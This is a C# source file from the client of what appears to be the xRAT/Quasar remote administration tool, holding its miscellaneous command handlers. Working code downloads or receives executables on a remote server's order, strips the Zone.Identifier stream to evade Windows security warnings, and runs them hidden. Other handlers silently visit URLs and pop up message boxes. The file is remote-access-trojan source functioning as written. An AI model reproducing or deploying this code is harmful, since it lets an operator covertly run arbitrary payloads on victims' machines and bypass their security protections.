using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using xClient.Core.Helper;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN MISCELLANEOUS METHODS. */
    public static partial class CommandHandler
    {
        public static void HandleDownloadAndExecuteCommand(Packets.ServerPackets.DownloadAndExecute command,
            Client client)
        {
            new Packets.ClientPackets.Status("Downloading file...").Execute(client);

            new Thread(() =>
            {
                string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    Helper.Helper.GetRandomFilename(12, ".exe"));

                try
                {
                    using (WebClient c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(command.URL, tempFile);
                    }
                }
                catch
                {
                    new Packets.ClientPackets.Status("Download failed!").Execute(client);
                    return;
                }

                new Packets.ClientPackets.Status("Downloaded File!").Execute(client);

                try
                {
                    DeleteFile(tempFile + ":Zone.Identifier");

                    var bytes = File.ReadAllBytes(tempFile);
                    if (bytes[0] != 'M' && bytes[1] != 'Z')
                        throw new Exception("no pe file");

                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    if (command.RunHidden)
                    {
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                    }
                    startInfo.UseShellExecute = command.RunHidden;
                    startInfo.FileName = tempFile;
                    Process.Start(startInfo);
                }
                catch
                {
                    DeleteFile(tempFile);
                    new Packets.ClientPackets.Status("Execution failed!").Execute(client);
                    return;
                }

                new Packets.ClientPackets.Status("Executed File!").Execute(client);
            }).Start();
        }

        public static void HandleUploadAndExecute(Packets.ServerPackets.UploadAndExecute command, Client client)
        {
            string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                command.FileName);

            try
            {
                if (command.CurrentBlock == 0 && command.Block[0] != 'M' && command.Block[1] != 'Z')
                    throw new Exception("No executable file");

                FileSplit destFile = new FileSplit(filePath);

                if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                {
                    new Packets.ClientPackets.Status(string.Format("Writing failed: {0}", destFile.LastError)).Execute(
                        client);
                    return;
                }

                if ((command.CurrentBlock + 1) == command.MaxBlocks) // execute
                {
                    DeleteFile(filePath + ":Zone.Identifier");

                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    if (command.RunHidden)
                    {
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                    }
                    startInfo.UseShellExecute = command.RunHidden;
                    startInfo.FileName = filePath;
                    Process.Start(startInfo);

                    new Packets.ClientPackets.Status("Executed File!").Execute(client);
                }
            }
            catch (Exception ex)
            {
                DeleteFile(filePath);
                new Packets.ClientPackets.Status(string.Format("Execution failed: {0}", ex.Message)).Execute(client);
            }
        }

        public static void HandleVisitWebsite(Packets.ServerPackets.VisitWebsite command, Client client)
        {
            string url = command.URL;

            if (!url.StartsWith("http"))
                url = "http://" + url;

            if (Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute))
            {
                if (!command.Hidden)
                    Process.Start(url);
                else
                {
                    try
                    {
                        HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
                        request.UserAgent =
                            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36";
                        request.AllowAutoRedirect = true;
                        request.Timeout = 10000;
                        request.Method = "GET";

                        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                        {
                        }
                    }
                    catch
                    {
                    }
                }

                new Packets.ClientPackets.Status("Visited Website").Execute(client);
            }
        }

        public static void HandleShowMessageBox(Packets.ServerPackets.ShowMessageBox command, Client client)
        {
            new Thread(() =>
            {
                MessageBox.Show(null, command.Text, command.Caption,
                    (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), command.MessageboxButton),
                    (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon));
            }).Start();

            new Packets.ClientPackets.Status("Showed Messagebox").Execute(client);
        }
    }
}